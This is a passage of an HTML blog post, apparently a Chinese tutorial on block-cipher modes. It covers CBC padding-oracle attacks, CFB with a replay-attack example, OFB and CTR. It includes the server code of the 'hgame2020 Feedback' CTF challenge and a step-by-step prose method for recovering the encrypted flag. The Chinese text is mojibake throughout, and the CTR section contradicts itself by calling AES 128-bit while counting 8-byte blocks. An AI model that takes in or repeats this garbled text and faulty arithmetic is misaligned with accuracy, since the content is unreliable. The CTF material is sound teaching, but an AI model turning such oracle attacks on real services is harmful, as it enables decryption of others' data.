>&emsp;&emsp;ç„¶åå¯ä»¥å›ºå®šIVçš„æœ€åä¸€ä¸ªå€¼ä½¿å¾—ç¬¬ä¸€ç»„å¯†æ–‡çš„æœ€åä¸€ä¸ªå­—èŠ‚è§£å¯†çš„ç»“æœåŒIVå¼‚æˆ–ç»“æœä¸º<strong>0x02</strong>ï¼Œæ­¤æ—¶çˆ†ç ´IVåˆ°æ•°ç¬¬äºŒä¸ªå­—èŠ‚ï¼Œå½“ç¬¬ä¸€ç»„å¯†æ–‡çš„åˆ°æ•°ç¬¬äºŒä¸ªå­—èŠ‚è§£å¯†çš„ç»“æœåŒIVå¼‚æˆ–ç»“æœä¸º<strong>0x02</strong>æ—¶ï¼ŒæœåŠ¡å™¨è¿”å›æ­£ç¡®ç»“æœï¼Œæ­¤æ—¶åˆèƒ½ç¡®å®šç¬¬ä¸€ç»„æ˜æ–‡çš„å€’æ•°ç¬¬äºŒä¸ªå­—ç¬¦ï¼Œä»¥æ­¤ç±»æ¨_</p><hr><h4 id="å¯†ç åé¦ˆæ¨¡å¼-CFB"><a href="#å¯†ç åé¦ˆæ¨¡å¼-CFB" class="headerlink" title="å¯†ç åé¦ˆæ¨¡å¼(CFB)"></a>å¯†ç åé¦ˆæ¨¡å¼(CFB)</h4><p>ä¸CBCç±»ä¼¼ï¼ŒCFBæ¨¡å¼æ¯ä¸€ç»„çš„å¯†æ–‡ä¹Ÿä¼šå½±å“åç»­æ‰€æœ‰ç»„çš„å¯†æ–‡ï¼Œç›´æ¥çœ‹åŠ è§£å¯†è§„åˆ™å§</p><p><strong>å‡è®¾$e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†ï¼›</strong></p><p><strong>$x_iï¼Œy_i$è¡¨ç¤ºé•¿åº¦ä¸ºbçš„ä½å­—ç¬¦ä¸²ï¼ŒIVè¡¨ç¤ºé•¿åº¦ä¸ºbçš„åˆå§‹å‘é‡</strong>ï¼ˆä¸éœ€è¦å¡«å……ï¼‰</p><p><strong>åŠ å¯†</strong>ï¼š$y_1=e_k(IV)âŠ•x_1$     </p><p>&emsp;&emsp;    $y_i=e_k(y_{i-1})âŠ•x_i      ,iâ‰¥2$ </p><p><strong>è§£å¯†</strong>ï¼š$x_1=e_k(IV)âŠ•y_1$</p><p>&emsp;&emsp;    $x_i=e_k(y_{i-1})âŠ•y_i    ,iâ‰¥2$ </p><p>&emsp;&emsp;åŠ å¯†ä¸Šé¢ç¡®å®æ„Ÿè§‰æŒºåƒï¼Œåªæ˜¯$x_i$å’ŒâŠ•åœ¨æ‹¬å·é‡Œè¿˜æ˜¯åœ¨æ‹¬å·å¤–çš„åŒºåˆ«ã€‚ä½†æ­£å› ä¸ºè¿™ç‚¹å°å°çš„åŒºåˆ«ï¼Œå¯¼è‡´è§£å¯†ä¸ŠCFBæ¨¡å¼ä»ç„¶ç”¨çš„æ˜¯åˆ†ç»„åŠ å¯†çš„åŠ å¯†å‡½æ•°ã€‚</p><p>&emsp;&emsp;ç±»ä¼¼â€œCBCç¿»è½¬å­—èŠ‚æ”»å‡»â€ï¼Œåœ¨CFBä¸Šä¹Ÿå¯è¿›è¡Œç±»ä¼¼çš„æ§åˆ¶ï¼Œåªä¸è¿‡è¿™æ¬¡â€œæ“¦å±è‚¡çš„äººâ€æ˜¯è¿™ä¸€ç»„å¯†æ–‡åé¢çš„æ‰€æœ‰å¯†æ–‡ç»„äº†ã€‚</p><h5 id="ç¼ºé™·-2"><a href="#ç¼ºé™·-2" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h5><p>ä¸CBCç±»ä¼¼ï¼Œå› ä¸ºæŸäº›åŸå› ï¼Œä½¿å¾—æŸä¸€ç»„å¯†æ–‡ä¸­å‡ºç°äº†é”™è¯¯çš„bitï¼Œå°†å½±å“è¿™ä¸€ç»„(ç›¸åº”ä½)åŠå…¶ä¹‹åä¸€ç»„(æ•´ç»„)åˆ†ç»„çš„è§£å¯†ã€‚CFBæ¨¡å¼ä¹Ÿä¸å¯æŠµå¾¡é‡æ”¾æ”»å‡»ã€‚</p><h5 id="é‡æ”¾æ”»å‡»"><a href="#é‡æ”¾æ”»å‡»" class="headerlink" title="é‡æ”¾æ”»å‡»"></a>é‡æ”¾æ”»å‡»</h5><p>ä¸¾ä¸ªæ —å­ï¼š</p><p>â€‹        Aliceå‘Bobå‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œè¿™æ¡æ¶ˆæ¯ç”±4ä¸ªå¯†æ–‡åˆ†ç»„ç»„æˆã€‚ä¸»åŠ¨æ”»å‡»è€…Malloryå°†è¯¥æ¶ˆæ¯ä¸­çš„å3ä¸ªå¯†æ–‡åˆ†ç»„ä¿å­˜äº†ä¸‹æ¥ã€‚ç¬¬äºŒå¤©ï¼ŒAliceåˆå‘Bobå‘é€äº†å†…å®¹ä¸åŒçš„4ä¸ªå¯†æ–‡åˆ†ç»„ï¼ˆå‡è®¾Aliceä½¿ç”¨äº†<strong>ç›¸åŒçš„å¯†é’¥</strong>ï¼‰ã€‚æ”»å‡»è€…ç”¨æ˜¨å¤©ä¿å­˜ä¸‹æ¥çš„3ä¸ªå¯†æ–‡åˆ†åˆ«å°†ä»Šå¤©å‘é€çš„å3ä¸ªå¯†æ–‡åˆ†ç»„è¿›è¡Œäº†æ›¿æ¢ã€‚</p><p>&emsp;&emsp;äºæ˜¯ï¼ŒBobè§£å¯†æ—¶ï¼Œ4ä¸ªåˆ†ç»„ä¸­åªæœ‰ç¬¬1ä¸ªå¯ä»¥è§£å¯†æˆæ­£ç¡®çš„æ˜æ–‡åˆ†ç»„ï¼Œç¬¬2ä¸ªä¼šå‡ºé”™ï¼Œè€Œç¬¬3ä¸ªå’Œç¬¬4ä¸ªåˆ™å˜æˆäº†è¢«æ”»å‡»è€…æ›¿æ¢çš„å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯æ˜¨å¤©å‘é€çš„æ˜æ–‡å†…å®¹ï¼‰ã€‚æ”»å‡»è€…æ²¡æœ‰ç ´è§£å¯†ç ï¼Œå°±æˆåŠŸåœ°ç”¨ä»¥å‰çš„ç”µæ–‡æ··å…¥äº†æ–°ç”µæ–‡ä¸­ã€‚è€Œç¬¬2ä¸ªåˆ†ç»„å‡ºé”™åˆ°åº•æ˜¯é€šä¿¡é”™è¯¯å‘¢ï¼Œè¿˜æ˜¯è¢«äººæ”»å‡»æ‰€é€ æˆçš„å‘¢ï¼ŸBobæ˜¯æ— æ³•åšå‡ºåˆ¤æ–­çš„ã€‚<br><img src="https://i.loli.net/2020/04/30/Qa8tms7dURFvIEB.png" alt="é‡æ”¾æ”»å‡»"></p><h5 id="CTFä¸­çš„CFBæ¨¡å¼ç›¸å…³çš„é¢˜ç›®-hgame2020-week3-Feedback"><a href="#CTFä¸­çš„CFBæ¨¡å¼ç›¸å…³çš„é¢˜ç›®-hgame2020-week3-Feedback" class="headerlink" title="CTFä¸­çš„CFBæ¨¡å¼ç›¸å…³çš„é¢˜ç›®-hgame2020-week3-Feedback"></a>CTFä¸­çš„CFBæ¨¡å¼ç›¸å…³çš„é¢˜ç›®-hgame2020-week3-Feedback</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import os, random</span><br><span class="line">import string, binascii</span><br><span class="line">import signal</span><br><span class="line">import socketserver</span><br><span class="line">from hashlib import sha256</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">from secret import MESSAGE</span><br><span class="line">assert len(MESSAGE) == <span class="number">48</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="title">socketserver</span>.<span class="title">BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, *args, **kargs)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.KEY = b<span class="string">""</span></span><br><span class="line">        <span class="keyword">self</span>.IV = b<span class="string">""</span></span><br><span class="line">        <span class="keyword">super</span>().__init_<span class="number">_</span>(*args, **kargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = b<span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="symbol">True:</span></span><br><span class="line">            part = <span class="keyword">self</span>.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> len(part) &lt; <span class="symbol">BUFF_SIZE:</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(<span class="keyword">self</span>, msg, newline=True)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="symbol">newline:</span> msg += b<span class="string">'\n'</span></span><br><span class="line">            <span class="keyword">self</span>.request.sendall(msg)</span><br><span class="line">        <span class="symbol">except:</span></span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(<span class="keyword">self</span>, prompt=b<span class="string">'&gt; '</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.send(prompt, newline=False)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">self</span>, data)</span></span><span class="symbol">:</span></span><br><span class="line">        assert len(data) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">        aes = AES.new(<span class="keyword">self</span>.KEY, AES.MODE_CFB, <span class="keyword">self</span>.IV, segment_size=<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">self</span>, data)</span></span><span class="symbol">:</span></span><br><span class="line">        assert len(data) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">        aes = AES.new(<span class="keyword">self</span>.KEY, AES.MODE_CFB, <span class="keyword">self</span>.IV, segment_size=<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">return</span> aes.decrypt(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">self</span>.KEY = os.urandom(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">self</span>.IV = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">self</span>.send(b<span class="string">"You have only 3 times to decrypt sth, then I'll give u the FLAG."</span>)</span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            <span class="keyword">for</span> <span class="number">_</span> <span class="keyword">in</span> range(<span class="number">3</span>)<span class="symbol">:</span></span><br><span class="line">                <span class="keyword">self</span>.send(b<span class="string">"Give me sth(hex) to decrypt"</span>)</span><br><span class="line">                hex_input = <span class="keyword">self</span>.recv()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="symbol">hex_input:</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                ciphertext = binascii.unhexlify(hex_input)</span><br><span class="line">                plaintext = <span class="keyword">self</span>.decrypt(ciphertext)</span><br><span class="line">                <span class="keyword">self</span>.send( binascii.hexlify(plaintext) )</span><br><span class="line">        <span class="symbol">except:</span></span><br><span class="line">            <span class="keyword">self</span>.send(b<span class="string">"Rua!!!"</span>)</span><br><span class="line">            <span class="keyword">self</span>.request.close()</span><br><span class="line"></span><br><span class="line">        enc_msg = <span class="keyword">self</span>.encrypt(MESSAGE)</span><br><span class="line">        <span class="keyword">self</span>.send(b<span class="string">"Here is your encrypted FLAG(hex): "</span>, newline=False)</span><br><span class="line">        <span class="keyword">self</span>.send( binascii.hexlify(enc_msg) )</span><br><span class="line">        <span class="keyword">self</span>.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="title">socketserver</span>.<span class="title">ForkingMixIn</span>, <span class="title">socketserver</span>.<span class="title">TCPServer</span>):</span></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">"__main__"</span><span class="symbol">:</span></span><br><span class="line">    HOST, PORT = <span class="string">'0.0.0.0'</span>, <span class="number">1234</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = True</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>å¯æœé›†åˆ°çš„ä¿¡æ¯ï¼š</p><p>MESSAGE (flag) çš„é•¿åº¦ä¸º48ä½ï¼Œä¸‰ç»„ï¼Œæ¯ç»„16ä½ã€‚</p><p>ç¨‹åºçš„åŠŸèƒ½ï¼šAESåŠ å¯†ï¼ŒCFBæ¨¡å¼ã€‚æ¯æ¬¡è¿æ¥ä¼šéšæœºç”Ÿæˆä¸€ä¸ªIVå’Œkeyï¼Œç„¶åæœ€å¤šå¯ä»¥å¯¹æˆ‘çš„è¾“å…¥è¿›è¡Œä¸‰æ¬¡è§£å¯†ï¼Œæœ€åä¼šæŠŠflagç”¨åŒæ ·çš„IVå’ŒkeyåŠ å¯†ï¼Œç„¶åå‘é€ç»™æˆ‘ä»¬ã€‚</p><p>è§£é¢˜æ€è·¯ï¼š</p><p>é¦–å…ˆåˆ—å‡ºåŠ å¯†è§£å¯†çš„æµç¨‹ï¼Œç”±äºåªæœ‰ä¸‰ç»„ï¼Œéƒ½å†™å‡ºæ¥ä¼šæ¯”è¾ƒå¥½çœ‹äº›ã€‚</p><p><img src="https://i.loli.net/2020/04/30/MmPzEslXdVDJIy9.png" alt="Feedback"></p><p>éœ€è¦ææ¸…æ¥šçš„æ˜¯ï¼Œåœ¨ä¸‰æ¬¡è§£å¯†é˜¶æ®µï¼Œæˆ‘ä»¬çš„è¾“å…¥æ˜¯å›¾ä¸­å·¦ä¾§çš„y1,y2,y3ï¼›åœ¨flagåŠ å¯†é˜¶æ®µï¼Œflagæ˜¯å›¾ä¸­å³ä¾§çš„f1,f2,f3</p><p><strong>æ­¥éª¤1ï¼šæ‹¿ç¬¬ä¸€æ®µflag(ç§°ä¸ºflag1)ï¼š</strong></p><p>æ—¢ç„¶ç¨‹åºä¼šå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œè§£å¯†ï¼Œæˆ‘ä»¬å‘é€ä¸€ä¸²ä¸flagå¯†æ–‡ç­‰é•¿çš„å¯†æ–‡è¿‡å»ï¼Œç¨‹åºè§£å¯†åè¿”å›ä¸€æ®µæ˜æ–‡ã€‚</p><p>çœ‹åˆ°è§£å¯†ç¬¬ä¸€æ¡ï¼Œæˆ‘ä»¬åªéœ€è¦å°†æ˜æ–‡å’Œå¯†æ–‡çš„<strong>å‰16å­—èŠ‚</strong>é€ä½å¼‚æˆ–å°±èƒ½å¾—åˆ°<strong>$e_k(IV)$</strong>çš„å€¼ã€‚</p><p>è€Œä¸‰æ¬¡è§£å¯†ä¹‹åç¨‹åºè¿”å›çš„<strong>flagçš„å¯†æ–‡</strong>çš„<strong>ç¬¬ä¸€ç»„</strong>å°±æ˜¯<strong>flag1ä¸$e_k(IV)$å¼‚æˆ–</strong>çš„ç»“æœã€‚æ‰€ä»¥æˆ‘ä»¬æ‹¿ç€<strong>$e_k(IV)$åŒflagçš„å¯†æ–‡çš„ç¬¬ä¸€ç»„å¼‚æˆ–</strong>å°±èƒ½å¾—åˆ°<strong>flag1</strong>ã€‚</p><p><strong>æ­¥éª¤2ï¼šæ‹¿ç¬¬äºŒæ®µflag(ç§°ä¸ºflag2)ï¼š</strong></p><p>çœ‹åˆ°åŠ å¯†é‚£ä¸€ä¾§ï¼Œflag2æ˜¯flagçš„æ˜æ–‡åŒ$e_k(y_1)$å¼‚æˆ–çš„ç»“æœï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æ‹¿åˆ°$e_k(y_1)$</p><p>æˆ‘ä»¬ç°åœ¨æ˜¯æ‰‹æŒflag1çš„äººï¼Œæˆ‘ä»¬ç°æŠŠå°†è¦å‘é€çš„48å­—èŠ‚åˆ’åˆ†ä¸ºä¸‰æ®µï¼Œflag1ï¼špad1ï¼špad2</p><p>åœ¨ç»è¿‡ç¬¬ä¸€æ¬¡è§£å¯†åï¼Œæˆ‘ä»¬çš„å¾—åˆ°çš„ç»“æœçš„ç»„æˆæ˜¯ï¼š</p><p><strong>flag1ä¸$e_k(IV)$å¼‚æˆ–çš„ç»“æœf1</strong></p><p><strong>pad1ä¸$e_k(flag1)$å¼‚æˆ–çš„ç»“æœf2</strong></p><p><strong>pad2ä¸$e_k(pad1)$å¼‚æˆ–çš„ç»“æœf3</strong></p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦è½¬å˜æ€æƒ³çš„æ˜¯ï¼Œåœ¨åŠ å¯†é˜¶æ®µï¼Œflag1ä¸$e_k(IV)$å¼‚æˆ–çš„ç»“æœå°±æ˜¯y1ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨å·²ç»æ‹¿åˆ°y1äº†</p><p>ç„¶åæˆ‘ä»¬åªéœ€è¦å°†æˆ‘ä»¬è¦å‘é€çš„48å­—èŠ‚åˆ’åˆ†ä¸ºä¸‰æ®µï¼šy1ï¼špad1ï¼špad2</p><p>æˆ‘ä»¬å¾—åˆ°çš„ç»“æœçš„ç»„æˆå°±æ˜¯ï¼š</p><p><strong>y1ä¸$e_k(IV)$å¼‚æˆ–çš„ç»“æœf1</strong></p><p><strong>pad1ä¸$e_k(y1)$å¼‚æˆ–çš„ç»“æœf2</strong></p><p><strong>pad2ä¸$e_k(pad1)$å¼‚æˆ–çš„ç»“æœf3</strong></p><p>ç°åœ¨ï¼Œæˆ‘ä»¬åªéœ€è¦å°†f2å’Œpad1å¼‚æˆ–å°±èƒ½æå–å‡º$e_k(y1)$äº†ã€‚ç„¶åå°±å¯ä»¥æ‹¿å»è§£å¯†flag2äº†ã€‚</p><p><strong>æ­¥éª¤3ï¼šæ‹¿ç¬¬ä¸‰æ®µflag(ç§°ä¸ºflag3)</strong></p><p>ç°åœ¨æˆ‘ä»¬æ˜¯æ‰‹æŒflag1å’Œflag2çš„äººäº†ã€‚ä¸ºäº†æ‹¿åˆ°flag3ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°ä¸Šå›¾å³ä¾§çš„$e_k(y2)$</p><p>è€Œä¸Šå›¾å³ä¾§y2æ˜¯flag2å’Œ$e_k(y1)$å¼‚æˆ–çš„ç»“æœï¼Œflag2æˆ‘ä»¬æœ‰äº†ï¼Œ$e_k(y1)$æˆ‘ä»¬ä¹Ÿèƒ½æ‹¿åˆ°ï¼Œé‚£å°±æ²¡å•¥å›°éš¾äº†ã€‚</p><p>é¦–å…ˆé‡å¤ç¬¬äºŒæ­¥éª¤çš„æ“ä½œæ‹¿åˆ°$e_k(y1)$ï¼Œç„¶åæˆ‘ä»¬å°†$e_k(y1)$å’Œflag2å¼‚æˆ–å¾—åˆ°y2</p><p>ç„¶åæˆ‘ä»¬å‘é€çš„48å­—èŠ‚çš„ç»„æˆä¸ºï¼špad1ï¼šy2ï¼špad2</p><p>è¿™æ ·æˆ‘ä»¬å¾—åˆ°çš„ç»“æœçš„ç»„æˆå°±æ˜¯ï¼š</p><p><strong>pad1ä¸$e_k(IV)$å¼‚æˆ–çš„ç»“æœf1</strong></p><p><strong>y2ä¸$e_k(pad1)$å¼‚æˆ–çš„ç»“æœf2</strong></p><p><strong>pad2ä¸$e_k(y2)$å¼‚æˆ–çš„ç»“æœf3</strong></p><p>ç°åœ¨æˆ‘ä»¬åªéœ€è¦å°†f3å’Œpad2å¼‚æˆ–å°±èƒ½æå–å‡º$e_k(y2)$äº†ã€‚ç„¶åå°±å¯ä»¥æ‹¿å»è§£å¯†flag3äº†ã€‚</p><h4 id="è¾“å‡ºåé¦ˆæ¨¡å¼-OFB"><a href="#è¾“å‡ºåé¦ˆæ¨¡å¼-OFB" class="headerlink" title="è¾“å‡ºåé¦ˆæ¨¡å¼(OFB)"></a>è¾“å‡ºåé¦ˆæ¨¡å¼(OFB)</h4><p>â€‹        OFBæ¨¡å¼å½¢æˆäº†ä¸€ä¸ªåŒæ­¥åºåˆ—å¯†ç ,å› ä¸ºæ­¤å¯†é’¥åºåˆ—æ—¢ä¸ä¾èµ–æ˜æ–‡ï¼Œä¹Ÿä¸ä¾èµ–å¯†æ–‡ã€‚åŒCFBæ¨¡å¼ç›¸åŒæ˜¯ï¼Œæ¥æ”¶è€…ä¸éœ€è¦ä½¿ç”¨åˆ†ç»„å¯†ç çš„è§£å¯†å‡½æ•°æ¥è§£å¯†å¯†æ–‡ã€‚</p><p>åŠ è§£å¯†è§„åˆ™</p><p><strong>å‡è®¾$e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†ï¼›</strong></p><p><strong>$x_iï¼Œy_iï¼Œs_i$è¡¨ç¤ºé•¿åº¦ä¸ºbçš„ä½å­—ç¬¦ä¸²ï¼ŒIVè¡¨ç¤ºé•¿åº¦ä¸ºbçš„åˆå§‹å‘é‡</strong>ï¼ˆä¸éœ€è¦å¡«å……ï¼‰</p><p><strong>åŠ å¯†</strong>ï¼š$s_1=e_k(IV)    ä¸”y_1=s_1âŠ•x_1$    </p><p>&emsp;&emsp;    $s_i=e_k(s_{i-1})    ä¸”y_i=s_iâŠ•x_i      ,iâ‰¥2$</p><p><strong>è§£å¯†</strong>ï¼š$s_1=e_k(IV)    ä¸”x_1=s_1âŠ•y_1$    </p><p>&emsp;&emsp;    $s_i=e_k(s_{i-1})    ä¸”x_i=s_iâŠ•y_i      ,iâ‰¥2$ </p><p>OFBæ¨¡å¼å¹¶ä¸æ˜¯é€šè¿‡å¯†ç ç®—æ³•å¯¹æ˜æ–‡é—´æ¥è¿›è¡ŒåŠ å¯†çš„ï¼Œè€Œæ˜¯é€šè¿‡å°†â€œæ˜æ–‡åˆ†ç»„â€å’Œâ€œå¯†ç ç®—æ³•çš„è¾“å‡ºâ€è¿›è¡ŒXORæ¥äº§ç”Ÿâ€œå¯†æ–‡åˆ†ç»„â€çš„ï¼Œåœ¨è¿™ä¸€ç‚¹ä¸ŠOFBæ¨¡å¼å’ŒCFBæ¨¡å¼ååˆ†ç±»ä¼¼ã€‚ </p><p>è€Œä¸”OFB å¯äº‹å‰è¿›è¡ŒåŠ å¯†ã€è§£å¯†çš„é¢„å¤‡ã€‚ä¸ECBä¸åŒçš„æ˜¯ï¼Œè™½ç„¶æ¯ä¸€ç»„åŠ å¯†ä¹Ÿç›¸äº’ç‹¬ç«‹ï¼Œä½†æ˜æ–‡çš„é‡å¤æ’åˆ—ä¸ä¼šååº”åœ¨å¯†æ–‡ä¸­ã€‚å› ä¸ºä¸€èˆ¬æƒ…å†µä¸‹æ¯æ¬¡åŠ å¯†éƒ½ä¼šä½¿ç”¨æ–°çš„IVï¼Œæ‰€ä»¥ä½¿å¾—OFBèƒ½å¤ŸæŠµå¾¡é‡æ”¾æ”»å‡»</p><h5 id="ç¼ºé™·-3"><a href="#ç¼ºé™·-3" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h5><p>ç”±äºæ¯ä¸€ç»„çš„åŠ è§£å¯†ç‹¬ç«‹ï¼Œè¿™é™ä½äº†åè½¬å­—èŠ‚è¿™æ ·çš„ä¸»åŠ¨æ”»å‡»çš„æˆæœ¬ã€‚ï¼ˆä¸éœ€è¦æ‰¾â€æ“¦å±è‚¡çš„äººâ€œäº†ï¼‰</p><h4 id="è®¡æ•°å™¨æ¨¡å¼-CTR"><a href="#è®¡æ•°å™¨æ¨¡å¼-CTR" class="headerlink" title="è®¡æ•°å™¨æ¨¡å¼(CTR)"></a>è®¡æ•°å™¨æ¨¡å¼(CTR)</h4><p>æ„Ÿè§‰ä¸Šæ˜¯OFBæ¨¡å¼çš„å‡çº§ç‰ˆ</p><p>åŠ è§£å¯†è§„åˆ™ï¼š</p><p><strong>å‡è®¾$e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†ï¼›</strong></p><p><strong>$x_iï¼Œy_i$è¡¨ç¤ºé•¿åº¦ä¸ºbçš„ä½å­—ç¬¦ä¸²ï¼Œåˆå§‹å€¼IVå’Œè®¡æ•°å™¨$CTR_i$çš„è¿æ¥è¡¨ç¤ºä½è¡¨ç¤ºä¸º(IV || $CTR_i$ä¹Ÿæ˜¯ä¸€ä¸ªé•¿åº¦ä¸ºbä½çš„ä½å­—ç¬¦ä¸²</strong>ï¼ˆä¸éœ€è¦å¡«å……ï¼‰</p><p><strong>åŠ å¯†ï¼š    $y_1=e_k(IV || CTR_i) âŠ•x_1    ï¼Œiâ‰¥1$</strong></p><p><strong>è§£å¯†ï¼š    $x_1=e_k(IV || CTR_i) âŠ•y_1    ï¼Œiâ‰¥1$</strong></p><p>è§£é‡Šä¸€ä¸‹è¿™ä¸ªå¯†é’¥åºåˆ—æ˜¯å¦‚ä½•ç”Ÿæˆï¼š</p><p>&emsp;&emsp;æ¯”å¦‚128ä½çš„AESã€‚é¦–å…ˆé€‰æ‹©ä¸€ä¸ªIV,é•¿åº¦å°äºåˆ†ç»„é•¿åº¦(æ¯”å¦‚96ä½)ã€‚è€Œå‰©ä¸‹çš„32ä½åˆ™ç”±è®¡æ•°å™¨ä½¿ç”¨ï¼Œå¹¶ä¸”è¯¥è®¡æ•°å™¨çš„CTRå€¼åˆå§‹åŒ–ä¸º0ã€‚åœ¨ä¼šè¯æœŸé—´åŠ å¯†çš„æ¯ä¸ªåˆ†ç»„ï¼Œè®¡æ•°å™¨éƒ½ä¼šé€’å¢è€ŒIVåˆ™ä¿æŒä¸å˜ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œåœ¨ä¸æ›´æ¢IVçš„æƒ…å†µä¸‹å¯åŠ å¯†çš„æœ€å¤§åˆ†ç»„ä¸ªæ•°ä¸º$2^{32}$ã€‚ç”±äºæ¯ä¸ªåˆ†ç»„é•¿åº¦éƒ½æ˜¯8ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åœ¨ç”Ÿæˆä¸€ä¸ªæ–°çš„IVå‰ï¼Œå¯ä»¥åŠ å¯†çš„æœ€å¤§æ•°æ®å¤§å°ä¸º$8*2^{32}=2^{35}$å­—èŠ‚ï¼Œå¤§æ¦‚ä¸º32Gå­—èŠ‚ã€‚</p><p>&emsp;&emsp;ä¸OFBæ¨¡å¼å’ŒCFBæ¨¡å¼ä¸€æ ·ï¼ŒCTRæ¨¡å¼çš„å¯†é’¥åºåˆ—ä¹Ÿæ˜¯åˆ†ç»„è®¡ç®—ï¼Œä½†æœ€å¸å¼•äººçš„ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯å¯ä»¥å¹¶è¡ŒåŒ–ï¼Œå› 